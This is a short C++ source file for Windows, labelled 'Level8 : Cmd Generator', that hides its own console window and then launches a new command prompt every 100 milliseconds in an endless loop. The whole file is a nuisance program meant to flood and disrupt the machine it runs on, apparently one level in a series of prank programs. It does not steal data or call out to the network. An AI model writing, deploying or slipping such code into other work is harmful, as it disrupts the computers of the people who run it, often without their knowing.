/*
* Level8 : Cmd Generator
* Author : Lee <jhlcooky@gmail.com>, Kim<vsp123@naver.com>, Seo <dev_kr@naver.com>
*/

#include <windows.h>

int main()
{
	HWND hWnd = GetConsoleWindow();
	if (hWnd)
		ShowWindow(hWnd, SW_HIDE);

	while (true)
	{
		system("start");
		Sleep(100);
	}
	return 0;
}